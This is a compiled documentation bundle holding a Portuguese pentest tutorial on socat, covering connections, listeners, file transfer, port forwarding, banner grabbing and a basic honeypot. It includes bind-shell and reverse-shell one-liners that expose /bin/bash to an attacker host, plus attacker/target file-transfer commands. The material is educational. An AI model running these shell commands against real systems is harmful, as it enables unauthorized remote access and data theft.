"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[1943],{7828:(e,a,n)=>{n.r(a),n.d(a,{assets:()=>i,contentTitle:()=>d,default:()=>p,frontMatter:()=>r,metadata:()=>c,toc:()=>l});var o=n(4848),s=n(8453);const r={id:"socat",title:"socat"},d=void 0,c={id:"pentest/socat",title:"socat",description:"O socat (SOcket CAT) \xe9 uma ferramenta flex\xedvel de linha de comando que",source:"@site/docs/pentest/socat.mdx",sourceDirName:"pentest",slug:"/pentest/socat",permalink:"/my-docs/docs/pentest/socat",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{id:"socat",title:"socat"},sidebar:"tutorialSidebar",previous:{title:"paramspider",permalink:"/my-docs/docs/pentest/paramspider"},next:{title:"sqli",permalink:"/my-docs/docs/pentest/sqli"}},i={},l=[{value:"Principais usos",id:"principais-usos",level:2},{value:"Conectando",id:"conectando",level:2},{value:"Conex\xe3o TCP",id:"conex\xe3o-tcp",level:3},{value:"Conex\xe3o UDP",id:"conex\xe3o-udp",level:3},{value:"Escutando",id:"escutando",level:2},{value:"Escuta TCP",id:"escuta-tcp",level:3},{value:"Escuta UDP",id:"escuta-udp",level:3},{value:"Transfer\xeancia de Arquivos",id:"transfer\xeancia-de-arquivos",level:2},{value:"Upload",id:"upload",level:3},{value:"Download",id:"download",level:3},{value:"Encaminhando Sa\xedda de Comandos",id:"encaminhando-sa\xedda-de-comandos",level:2},{value:"Expondo Shell",id:"expondo-shell",level:2},{value:"Bind Shell",id:"bind-shell",level:3},{value:"Reverse Shell",id:"reverse-shell",level:3},{value:"Encapsulando em SSL/TLS",id:"encapsulando-em-ssltls",level:2},{value:"Exemplo de Conex\xe3o Criptografada",id:"exemplo-de-conex\xe3o-criptografada",level:3},{value:"Encaminhando Portas (Port Forwarding)",id:"encaminhando-portas-port-forwarding",level:2},{value:"Escaneando Portas",id:"escaneando-portas",level:2},{value:"Banner Grabbing",id:"banner-grabbing",level:2},{value:"HTTP",id:"http",level:3},{value:"FTP",id:"ftp",level:3},{value:"Honeypot Simples",id:"honeypot-simples",level:2},{value:"Conclus\xe3o",id:"conclus\xe3o",level:2}];function t(e){const a={admonition:"admonition",br:"br",code:"code",em:"em",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsxs)(a.p,{children:["O ",(0,o.jsx)(a.code,{children:"socat"})," (",(0,o.jsx)(a.strong,{children:"SO"}),"cket ",(0,o.jsx)(a.strong,{children:"CAT"}),") \xe9 uma ferramenta flex\xedvel de linha de comando que\npermite a transfer\xeancia de dados entre dois endpoints, sejam eles soquetes\nTCP/UDP, portas seriais, arquivos, pipes ou at\xe9 mesmo conex\xf5es criptografadas.\nEle pode ser comparado ao ",(0,o.jsx)(a.code,{children:"nc"})," (netcat), mas oferece mais recursos e op\xe7\xf5es de\nconfigura\xe7\xe3o."]}),"\n",(0,o.jsx)(a.h2,{id:"principais-usos",children:"Principais usos"}),"\n",(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsx)(a.li,{children:"Redirecionamento de portas (TCP e UDP);"}),"\n",(0,o.jsx)(a.li,{children:"Tunelamento de conex\xf5es, com ou sem criptografia;"}),"\n",(0,o.jsx)(a.li,{children:"Encapsulamento de dados em SSL/TLS;"}),"\n",(0,o.jsx)(a.li,{children:"Cria\xe7\xe3o de proxies TCP simples;"}),"\n",(0,o.jsx)(a.li,{children:"Escuta e teste de daemons de rede;"}),"\n",(0,o.jsx)(a.li,{children:"Transfer\xeancia de arquivos entre hosts;"}),"\n",(0,o.jsx)(a.li,{children:"Exposi\xe7\xe3o de shell (bind shell e reverse shell);"}),"\n",(0,o.jsx)(a.li,{children:"Encaminhamento de conex\xf5es para processos locais, portas seriais, etc."}),"\n"]}),"\n",(0,o.jsx)(a.h2,{id:"conectando",children:"Conectando"}),"\n",(0,o.jsxs)(a.p,{children:["Assim como o ",(0,o.jsx)(a.code,{children:"nc"}),", o ",(0,o.jsx)(a.code,{children:"socat"}),' pode efetuar conex\xf5es TCP. Por\xe9m, a sintaxe dele \xe9\ndiferente, pois precisamos especificar dois "addresses" (endere\xe7os) que ele ir\xe1\nconectar ou escutar.']}),"\n",(0,o.jsx)(a.h3,{id:"conex\xe3o-tcp",children:"Conex\xe3o TCP"}),"\n",(0,o.jsx)(a.p,{children:"Para estabelecer uma conex\xe3o TCP a um destino 172.16.1.4 na porta 110, podemos\nutilizar:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO TCP:172.16.1.4:110\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"STDIO"}),": indica que o socat usar\xe1 a entrada/sa\xedda padr\xe3o do terminal;",(0,o.jsx)(a.br,{}),"\n",(0,o.jsx)(a.strong,{children:"TCP:172.16.1.4:110"}),": indica que iremos utilizar TCP, conectando na porta 110\ndo IP 172.16.1.4."]})}),"\n",(0,o.jsx)(a.h3,{id:"conex\xe3o-udp",children:"Conex\xe3o UDP"}),"\n",(0,o.jsx)(a.p,{children:"Para utilizar UDP em vez de TCP, basta trocar a especifica\xe7\xe3o:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO UDP:127.0.0.1:9000\n"})}),"\n",(0,o.jsx)(a.h2,{id:"escutando",children:"Escutando"}),"\n",(0,o.jsxs)(a.p,{children:["O socat tamb\xe9m permite que voc\xea crie um ",(0,o.jsx)(a.em,{children:"listener"}),", ou seja, uma porta que\nficar\xe1 escutando conex\xf5es externas (semelhante ao ",(0,o.jsx)(a.code,{children:"nc -l"}),")."]}),"\n",(0,o.jsx)(a.h3,{id:"escuta-tcp",children:"Escuta TCP"}),"\n",(0,o.jsx)(a.p,{children:"Para escutar na porta 5050 em modo TCP:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork STDOUT\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"TCP-LISTEN:5050"}),": indica que vamos escutar na porta 5050 usando TCP;\n",(0,o.jsx)(a.strong,{children:"fork"}),": faz com que, a cada nova conex\xe3o, o processo seja duplicado (",(0,o.jsx)(a.em,{children:"fork"}),"),\npermitindo aceitar m\xfaltiplas conex\xf5es sequencialmente;\n",(0,o.jsx)(a.strong,{children:"STDOUT"}),": direciona a sa\xedda para a sa\xedda padr\xe3o."]})}),"\n",(0,o.jsx)(a.p,{children:"Depois, no outro lado, podemos nos conectar com:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO TCP:192.168.0.10:5050\n"})}),"\n",(0,o.jsx)(a.h3,{id:"escuta-udp",children:"Escuta UDP"}),"\n",(0,o.jsx)(a.p,{children:"Para escutar na porta 9000 com UDP:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat UDP-LISTEN:9000,fork STDOUT\n"})}),"\n",(0,o.jsx)(a.h2,{id:"transfer\xeancia-de-arquivos",children:"Transfer\xeancia de Arquivos"}),"\n",(0,o.jsxs)(a.p,{children:["O socat pode ser utilizado para transferir arquivos ou dados de forma semelhante\nao ",(0,o.jsx)(a.code,{children:"nc"}),", pois ele simplesmente redireciona fluxos de dados."]}),"\n",(0,o.jsx)(a.h3,{id:"upload",children:"Upload"}),"\n",(0,o.jsx)(a.p,{children:"No alvo (que receber\xe1 o arquivo):"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"touch arquivo_recebido\nsocat TCP-LISTEN:5050,fork OPEN:arquivo_recebido\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:["Note que criamos o arquivo antes, mesmo que vazio, ele precisa existir.",(0,o.jsx)(a.br,{}),"\n",(0,o.jsxs)(a.strong,{children:["OPEN",":arquivo_recebido"]}),": faz com que tudo que chegar na porta 5050 seja\nescrito diretamente no arquivo ",(0,o.jsx)(a.code,{children:"arquivo_recebido"}),"."]})}),"\n",(0,o.jsx)(a.p,{children:"No atacante (que enviar\xe1 o arquivo):"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat OPEN:arquivo_para_enviar TCP:172.16.2.6:5050\n"})}),"\n",(0,o.jsx)(a.h3,{id:"download",children:"Download"}),"\n",(0,o.jsx)(a.p,{children:"No atacante (onde est\xe1 o arquivo):"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork OPEN:arquivo_para_enviar\n"})}),"\n",(0,o.jsx)(a.p,{children:"No alvo (que vai iniciar a conex\xe3o para baixar o arquivo):"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"touch arquivo_recebido\nsocat TCP:172.16.2.5:5050 OPEN:arquivo_recebido\n"})}),"\n",(0,o.jsx)(a.h2,{id:"encaminhando-sa\xedda-de-comandos",children:"Encaminhando Sa\xedda de Comandos"}),"\n",(0,o.jsxs)(a.p,{children:["Podemos redirecionar a sa\xedda de um comando para o socat a fim de enviar essa\nsa\xedda atrav\xe9s de uma conex\xe3o de rede.\nPor exemplo, para enviar a sa\xedda de ",(0,o.jsx)(a.code,{children:"cat /etc/os-release"})," para quem se conectar\nna porta 5050:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork SYSTEM:'cat /etc/os-release'\n"})}),"\n",(0,o.jsxs)(a.p,{children:["Quando algu\xe9m se conectar usando outro ",(0,o.jsx)(a.code,{children:"socat"})," ou ",(0,o.jsx)(a.code,{children:"nc"})," nessa porta, receber\xe1 o\nconte\xfado do arquivo ",(0,o.jsx)(a.code,{children:"/etc/os-release"}),"."]}),"\n",(0,o.jsx)(a.h2,{id:"expondo-shell",children:"Expondo Shell"}),"\n",(0,o.jsx)(a.p,{children:"Assim como no nc, \xe9 poss\xedvel usar o socat para expor uma shell."}),"\n",(0,o.jsx)(a.h3,{id:"bind-shell",children:"Bind Shell"}),"\n",(0,o.jsxs)(a.p,{children:["Executado na m\xe1quina-alvo para abrir a porta 5050 e expor ",(0,o.jsx)(a.code,{children:"/bin/bash"}),":"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork EXEC:/bin/bash\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"EXEC:/bin/bash"}),": executa o comando /bin/bash e redireciona o I/O\n(Input/Output)."]})}),"\n",(0,o.jsx)(a.p,{children:"Depois, no atacante, basta conectar:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO TCP:192.168.0.10:5050\n"})}),"\n",(0,o.jsx)(a.h3,{id:"reverse-shell",children:"Reverse Shell"}),"\n",(0,o.jsx)(a.p,{children:"Executado na m\xe1quina-alvo, que far\xe1 a conex\xe3o ativa de volta para 192.168.0.100\nna porta 5050, expondo /bin/bash:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP:192.168.0.100:5050 EXEC:/bin/bash\n"})}),"\n",(0,o.jsx)(a.p,{children:"No atacante, precisamos escutar:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:5050,fork STDOUT\n"})}),"\n",(0,o.jsx)(a.h2,{id:"encapsulando-em-ssltls",children:"Encapsulando em SSL/TLS"}),"\n",(0,o.jsxs)(a.p,{children:["Um dos maiores diferenciais do socat em rela\xe7\xe3o ao ",(0,o.jsx)(a.code,{children:"nc"})," \xe9 a capacidade de\nestabelecer conex\xf5es criptografadas usando SSL/TLS de maneira nativa."]}),"\n",(0,o.jsx)(a.h3,{id:"exemplo-de-conex\xe3o-criptografada",children:"Exemplo de Conex\xe3o Criptografada"}),"\n",(0,o.jsx)(a.p,{children:"Servidor escutando em TLS:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat OPENSSL-LISTEN:443,cert=server.crt,key=server.key,verify=0,fork STDOUT\n"})}),"\n",(0,o.jsx)(a.p,{children:"Cliente conectando-se ao servidor via TLS:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO OPENSSL:meuservidor.com:443,verify=0\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"Dica"}),": A op\xe7\xe3o ",(0,o.jsx)(a.code,{children:"verify=0"})," desabilita a verifica\xe7\xe3o do certificado, o que pode\nser \xfatil em testes ou ambientes de laborat\xf3rio. Em produ\xe7\xe3o, deve-se usar\nverifica\xe7\xe3o adequada."]})}),"\n",(0,o.jsx)(a.h2,{id:"encaminhando-portas-port-forwarding",children:"Encaminhando Portas (Port Forwarding)"}),"\n",(0,o.jsxs)(a.p,{children:["Com o ",(0,o.jsx)(a.code,{children:"socat"}),", \xe9 simples criar um t\xfanel redirecionando a porta local para outra\nporta/host."]}),"\n",(0,o.jsxs)(a.p,{children:["Por exemplo, se queremos que conex\xf5es na porta 8080 do host local sejam\nencaminhadas para ",(0,o.jsx)(a.code,{children:"192.168.1.100:80"}),", podemos usar:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80\n"})}),"\n",(0,o.jsx)(a.p,{children:"Qualquer conex\xe3o na porta local 8080 ser\xe1 ent\xe3o encaminhada para a porta 80 do\nendere\xe7o 192.168.1.100."}),"\n",(0,o.jsx)(a.h2,{id:"escaneando-portas",children:"Escaneando Portas"}),"\n",(0,o.jsxs)(a.p,{children:["O ",(0,o.jsx)(a.code,{children:"socat"})," n\xe3o \xe9 a melhor ferramenta para varredura de portas (como o ",(0,o.jsx)(a.code,{children:"nc"})," ou o\n",(0,o.jsx)(a.code,{children:"nmap"}),"), mas pode ser usado em scripts e one-liners para verificar a\ndisponibilidade de um determinado servi\xe7o."]}),"\n",(0,o.jsx)(a.p,{children:"Para testar se a porta 22 de um host est\xe1 aberta, podemos observar o retorno:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat - TCP:172.16.1.5:22\n"})}),"\n",(0,o.jsxs)(a.p,{children:["Caso a conex\xe3o seja estabelecida, o ",(0,o.jsx)(a.code,{children:"socat"})," aguardar\xe1 dados (ou fechar\xe1 se n\xe3o\nhouver resposta). Se a porta estiver fechada ou filtrada, a conex\xe3o falhar\xe1 e o\n",(0,o.jsx)(a.code,{children:"socat"})," retornar\xe1 erro."]}),"\n",(0,o.jsxs)(a.p,{children:["Para varreduras mais elaboradas, ",(0,o.jsx)(a.code,{children:"nc"}),", ",(0,o.jsx)(a.code,{children:"ncat"})," ou nmap s\xe3o mais adequados."]}),"\n",(0,o.jsx)(a.h2,{id:"banner-grabbing",children:"Banner Grabbing"}),"\n",(0,o.jsx)(a.p,{children:'Tamb\xe9m podemos fazer o "banner grabbing" de um servi\xe7o, enviando comandos e\nanalisando as respostas diretamente no terminal.'}),"\n",(0,o.jsx)(a.h3,{id:"http",children:"HTTP"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"printf 'HEAD / HTTP/1.0\\n\\n' | \\\n  socat STDIO TCP:www.alvo.com:80\n"})}),"\n",(0,o.jsxs)(a.p,{children:["Ao digitar o comando ",(0,o.jsx)(a.code,{children:"HEAD / HTTP/1.0"})," e pressionar Enter duas vezes (no comando\nacima represantado pelo ",(0,o.jsx)(a.code,{children:"\\n\\n"}),"), veremos o banner de resposta do servidor HTTP."]}),"\n",(0,o.jsx)(a.h3,{id:"ftp",children:"FTP"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat STDIO TCP:192.168.1.100:21\nUSER anonymous\nPASS anonymous\n"})}),"\n",(0,o.jsx)(a.h2,{id:"honeypot-simples",children:"Honeypot Simples"}),"\n",(0,o.jsxs)(a.p,{children:["O socat pode ser usado de forma rudimentar para montar um ",(0,o.jsx)(a.em,{children:"honeypot"}),", embora\nexistam solu\xe7\xf5es mais completas voltadas a isso.\nUm exemplo seria apenas enviar um banner falso e registrar as entradas:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"cat << EOF > fake_ftp_banner.txt\n220 ProFTPD 1.3.4a Server (Ubuntu)\nEOF\n"})}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"while true; do\n  socat TCP-LISTEN:21,fork SYSTEM:'cat fake_ftp_banner.txt' |& tee -a ftp.log\n  echo \"$(date)\" >> ftp.log\ndone\n"})}),"\n",(0,o.jsxs)(a.p,{children:["Esse script simples escutar\xe1 na porta 21 e, ao receber uma conex\xe3o, enviar\xe1 o\nconte\xfado do fake_ftp_banner.txt. O ",(0,o.jsx)(a.code,{children:"tee"})," registrar\xe1 tudo no arquivo ftp.log."]}),"\n",(0,o.jsx)(a.h2,{id:"conclus\xe3o",children:"Conclus\xe3o"}),"\n",(0,o.jsxs)(a.p,{children:["O ",(0,o.jsx)(a.code,{children:"socat"})," \xe9 uma ferramenta poderosa, que vai al\xe9m do nc em muitos aspectos,\nprincipalmente devido ao suporte avan\xe7ado a SSL/TLS, suporte a portas seriais,\nfork, e diversas outras op\xe7\xf5es de endere\xe7amento. Para quem precisa de conex\xf5es\nmais vers\xe1teis e seguras, o socat \xe9 um excelente aliado, seja para simples\ntestes de portas ou para a constru\xe7\xe3o de t\xfaneis criptografados em ambientes de\nprodu\xe7\xe3o."]})]})}function p(e={}){const{wrapper:a}={...(0,s.R)(),...e.components};return a?(0,o.jsx)(a,{...e,children:(0,o.jsx)(t,{...e})}):t(e)}},8453:(e,a,n)=>{n.d(a,{R:()=>d,x:()=>c});var o=n(6540);const s={},r=o.createContext(s);function d(e){const a=o.useContext(r);return o.useMemo((function(){return"function"==typeof e?e(a):{...a,...e}}),[a,e])}function c(e){let a;return a=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:d(e.components),o.createElement(r.Provider,{value:a},e.children)}}}]);